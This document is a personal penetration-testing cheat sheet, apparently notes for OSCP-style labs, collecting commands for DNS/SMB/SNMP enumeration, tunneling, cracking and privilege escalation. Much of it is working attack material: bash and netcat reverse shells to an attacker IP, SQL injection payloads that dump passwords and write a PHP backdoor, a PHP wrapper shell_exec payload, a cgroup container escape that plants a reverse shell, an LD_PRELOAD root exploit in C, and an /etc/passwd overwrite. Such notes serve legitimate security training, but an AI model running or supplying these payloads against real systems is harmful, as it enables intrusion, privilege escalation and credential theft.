# Pentest

## Practical Tools

### File transfer

Sending a file through netcat

```bash
# Receiver
nc -l -p 1234 > out.file

# Sender
nc -w 3 [destination] 1234 < out.file
```

## Enumeration

### DNS Enumeration

```
host -t mx megacorpone.com
for ip in $(cat list.txt); do host $ip.megacorpone.com; done
for ip in $(seq  50 100); do host 38.100.193.$ip; done | grep -v "not found"
# DNS zone transfer
host -l DOMAIN DNS_SERVER
dnsrecon -d megacorpone.com -t axfr
dnsenum zonetransfer.me
# brute force
dnsrecon -d megacorpone.com -D ~/list.txt -t brt
```

```
# oscp exercise, figuring out domain from private dns
dig -x 192.168.151.149  @192.168.151.149
dig TXT @192.168.151.149 dc.MAILMAN.com 
```

#### **Brute force subdomains**

```bash
gobuster vhost -u cybercrafted.thm -w ~/pentest/wordlists/shubs-subdomains.txt 
```

```bash
wfuzz -c -f sub-fighter.txt -Z \
    -w ~/pentest/wordlists/shubs-subdomains.txt \
    -H "Host: FUZZ.cmess.thm" --hw 290 cmess.thm
```

### Port scanning

configure firewall to return RST when TCP port scan occurs (TCP SYN is spoofed)

```
iptables -I INPUT -p tcp --dport <port> -j REJECT --reject-with tcp-reset
```

This can make it extremely difficult (if not impossible) to get an accurate reading of the target(s).

|                                        |                                                           |
| -------------------------------------- | --------------------------------------------------------- |
| ping sweep                             | `nmap -sn 192.168.0.1-254`                                |
| SYN scan                               | `sudo nmap -sS 192.168.0.1-254`                           |
| UDP scan                               | `nmap -sU --top-ports 20 <target>`                        |
| OS fingerprinting                      | sudo nmap -O 10.11.1.220                                  |
| dont ping host, avoid windows firewall | -Pn                                                       |
| Banner grabbing                        | nmap -sV -sT 10.11.1.220                                  |
| Service enumeration scripts            | nmap -A 10.11.1.220                                       |
| script (dns zone transfer)             | nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com |
| export all                             | nmap -oA all 192.168.0.1                                  |

```
nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php'
```

https://nmap.org/nsedoc/

### SMB Enumeration

* NetBIOS : TCP port 139
* SMB : TCP port 445

```
nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254
# NetBIOS specific tool
sudo nbtscan -r 10.11.1.0/24
```

```
nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
```

Enumerate samba shares

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.170.159
```

<pre><code>for ip in $(cat smb_ips.txt); do enum4linux -a $ip; done
<strong>smbclient -U alfred -L //192.168.177.13/files</strong></code></pre>

### NFS Enumeration&#x20;

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.170.159
# or nmap -p 111 --script nfs* 10.11.1.72
nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
```

say that `/var` has been found, we can mount it locally like that:

```
mkdir tempnfs
sudo mount -o nolock TARGET_IP:/var tempnfs
```

If permission denied for some files, create user with the same UUID

```
sudo adduser pwn # (uuid = 1001)
sudo sed -i -e 's/1001/1014/g' /etc/passwd
```

### SMTP Enumeration&#x20;

* _VRFY_ request asks the server to verify an email address
* _EXPN_ asks the server for the membership of a mailing list.

verify existing users on a mail server

```python
#!/usr/bin/python
import socket
import sys
if len(sys.argv) != 2:
        print "Usage: vrfy.py <username>"
        sys.exit(0)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('10.11.1.217',25))
banner = s.recv(1024)
print banner
# VRFY a user
s.send('VRFY ' + sys.argv[1] + '\r\n')
result = s.recv(1024)
print result
s.close()
```

### SNMP Enumeration

Simple Network Management Protocol, based on UDP, IP spoofing and replay attacks\
The SNMP MIB Tree (Management Information Base, database containing information usually related to network management)

Windows SNMP MIB values

| 1.3.6.1.2.1.25.1.6.0   | System Processes |
| ---------------------- | ---------------- |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path   |
| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units    |
| 1.3.6.1.2.1.25.6.3.1.2 | Software Name    |
| 1.3.6.1.4.1.77.1.2.25  | User Accounts    |
| 1.3.6.1.2.1.6.13.1.3   | TCP Local Ports  |

```
sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt
```

brute force

```
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips
onesixtyone -c community -i ips
```

#### Windows SNMP Enumeration Example

provided we at least know the SNMP read-only community string, which in most cases is "public".

Enumerating the Entire MIB Tree

```
snmpwalk -c public -v1 -t 10 10.11.1.14
```

Enumerating Windows Users

```
snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25
```

Enumerating Running Windows Processes

```
snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2
```

Enumerating Open TCP Ports

```
snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3
```

Enumerating Installed Software

```
snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2
```

### Dirb

```shell
# -r to scan non-recursively
# -z 10 to add a 10 millisecond delay to each request
dirb http://www.megacorpone.com -r -z 10
```

### Nikto

```
nikto -host=http://www.megacorpone.com -maxtime=30s
```

## Web application

### Web Servers

```
python -m SimpleHTTPServer 7331
python3 -m http.server 7331
php -S 0.0.0.0:8000
ruby -run -e httpd . -p 9000
busybox httpd -f -p 10000
```

#### PHP Wrappers

```
http://10.11.0.22/menu.php?file=data:text/plain,hello world
http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```

### SQL Injection

#### Extracting Data from the Database

```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version
http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()
http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables
http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users
```

#### From SQL Injection to Code Execution

```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'

```

#### **sqlmap**

in google chrome, open network, select call and and copy request header, paste it to a file req.txt

```
sqlmap -r req.txt 
```

other examples:

```
sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump
sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
```

### Cross-Site Scripting (XSS)

* _Stored XSS attacks /_ _Persistent XSS:_ exploit stored server --> attack all users of the site.&#x20;
* _Reflected XSS attacks_: the payload in a crafted request or link --> attacks the person submitting the request or viewing the link
* _DOM-based XSS attacks:_ similar to the other two, solely within the page's DOM

## Networking

### **Tunneling**

Using socat ([static binaries](https://github.com/andrew-d/static-binaries))

Expose port 22 on 8888 (if 22 is only open to localhost for example)

```
socat -d -d TCP-LISTEN:8888,reuseaddr,fork TCP:localhost:22
```

Reverse tunnel :&#x20;

```bash
./chisel server -p 12312 --reverse # attacker
./chisel client 10.10.14.4:12312 R:3306:172.17.0.4:3306 #victim
mysql -uUSER -pPASSWORD -h 127.0.0.1 #attacker
```

### SIP / VoIP

{% embed url="https://www.kali.org/tools/sipvicious/" %}

### tcpdump

Packets that have the _PSH_ and _ACK_ flags turned on.&#x20;

* All packets sent and received after the initial 3-way handshake will have the _ACK_ flag set.&#x20;
* The _PSH_ flag is used to enforce immediate delivery of a packet and is commonly used in interactive _Application Layer_ protocols to avoid buffering

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

_ACK_ and _PSH_ are represented by the fourth and fifth bits of the 14th byte(\[13]), respectively

Turning on only these bits would give us _00011000_, or decimal 24.

```
sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
```

## Reverse shell

```bash
bash -i >& /dev/tcp/10.9.6.147/4242 0>&1
nc -lvnp 4242

mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc attacker_ip 4242 1>/tmp/backpipe
```

### Socat Reverse Shells

```bash
socat -d -d TCP4-LISTEN:443 STDOUT
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

### Socat Encrypted Bind Shells

**openssl**

* req: initiate a new certificate signing request
* \-newkey: generate a new private key
* rsa:2048: use RSA encryption with a 2,048-bit key length.
* \-nodes: store the private key without passphrase protection
* \-keyout: save the key to a file
* \-x509: output a self-signed certificate instead of a certificate request
* \-days: set validity period in days
* \-out: save the certificate to a file

```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
socat - OPENSSL:10.11.0.4:443,verify=0
```

\


### Get a pseudo terminal over netcat reverse shell

<pre class="language-bash"><code class="lang-bash">python -c 'import pty;pty.spawn("/bin/bash")' # or
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z , Enter 
<strong>stty raw -echo
</strong>fg
# Enter, Enter
export TERM=xterm-256-color</code></pre>

msfvenom : generate reverse shell #todo

## Privilege escalation

### Manual enumeration

```
C:\Users\student>whoami
C:\Users\student>net user student
C:\Users\student>net user
C:\Users\student>hostname
C:\Users\student>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
# processes and services
C:\Users\student>tasklist /SVC
C:\Users\student>ipconfig /all
C:\Users\student>route print
C:\Users\student>netstat -ano
C:\Users\student>netsh advfirewall show currentprofile
C:\Users\student>netsh advfirewall firewall show rule name=all
c:\Users\student>schtasks /query /fo LIST /v
# Enumerating Installed Applications and Patch Levels
c:\Users\student>wmic product get name, version, vendor
c:\Users\student>wmic qfe get Caption, Description, HotFixID, InstalledOn
# Enumerating Readable/Writable Files and Directories
c:\Tools\privilege_escalation\SysinternalsSuite>accesschk.exe -uws "Everyone" "C:\Program Files"
PS C:\Tools\privilege_escalation\SysinternalsSuite>Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
c:\Users\student>mountvol

# Enumerating Device Drivers and Kernel Modules
PS C:\Users\student> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
PS C:\Users\student> Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}

# Enumerating Binaries That AutoElevate
c:\Users\student>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
c:\Users\student>reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

```



```
student@debian:~$ cat /etc/issue
student@debian:~$ cat /etc/*-release
student@debian:~$ uname -a
student@debian:~$ ip a
student@debian:~$ /sbin/route
student@debian:~$ ss -anp
student@debian:~$ ls -lah /etc/cron*
student@debian:~$ cat /etc/crontab
student@debian:~$ dpkg -l
student@debian:~$ find / -writable -type d 2>/dev/null
student@debian:~$ cat /etc/fstab 
student@debian:~$ mount
student@debian:~$ /bin/lsblk
# enumerate the loaded kernel modules
student@debian:~$ lsmod
student@debian:~$ /sbin/modinfo libata
student@debian:~$ find / -perm -u=s -type f 2>/dev/null
```

\


### SUID

#### Find suid

```bash
find / -perm -u=s -type f 2>/dev/null
```

#### Abuse python suid&#x20;

```bash
python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

### **Override /etc/passwd**

generate password salt

```
openssl passwd -1 -salt ignite pass123
# $1$ignite$3eTbJm98O9Hz.k1NTdNxe1
```

Replace

```
jessie:x:1000:1000:jessie,,,:/home/jessie:/bin/bash
```

by

```
jessie:$SALT$:1000:1000:jessie,,,:/home/jessie:/bin/bash
```

### Escape docker privileged container to be run as root

{% embed url="https://thesecmaster.com/how-to-fix-cve-2022-0492-privilege-escalation-and-container-escape-vulnerabilities-in-cgroups/" %}

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation" %}

```bash
# Create new cgroup and namespace
unshare -UrmC bash
```

```bash
mount -t cgroup -o rdma cgroup /mnt
echo 1 > /mnt/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /mnt/release_agent
echo '#!/bin/sh' > /cmd
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.6.147 4242 >/tmp/f" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /mnt/cgroup.procs"
```

### **LD\_PRELOAD**

if you see `env_keep+=LD_PRELOAD` in `sudo -l`, then, create `pe.c` :

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Then compile it using:

```bash
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Finally, escalate privileges running

```bash
sudo LD_PRELOAD=pe.so <COMMAND> # Use any command you can run with sudo
```

## Cryptography

Get SSL certificate from pcap

```bash
binwalk capture.pcap --dd=.*
```

Check certificate

```bash
openssl x509 -in cert.der -inform DER -text
```

Standard sizes for RSA keys :

| Key size   | Key strength           |
| ---------- | ---------------------- |
| 512 bits   | Low-strength key       |
| 1024 bits  | Medium-strength key    |
| 2048  bits | High-strength key      |
| 4096 bits  | Very high-strength key |

Generate private RSA key from weak one : [https://github.com/RsaCtfTool/RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool)



## Cracking

### John

have a hash.txt file containing

```
username:hash
```

then run :

```
john --wordlist=~/pentest/wordlist/rockyou.txt --format=raw-md5 hash.txt
```

word mangling: markus --> Markus1, Markus2, Markus3, MArkus, MARkus, MARKus, Markus!

```bash
john --single --format=[format] [path to file]
```

Cracking with salt

in the hash.txt file, put \[HASH]$\[SALT]

```bash
john --wordlist=~/pentest/wordlist/rockyou.txt \
    --format='dynamic=sha512($p.$s)' hash.txt
```

## Escape

Alternative to `cat` :&#x20;

```bash
cp FILE /dev/stdout
```

## Antivirus evasion

Check binary against multiple antivirus : [https://www.virustotal.com/gui/home/upload](https://www.virustotal.com/gui/home/upload)

Craft payload : [https://github.com/Veil-Framework/Veil](https://github.com/Veil-Framework/Veil)
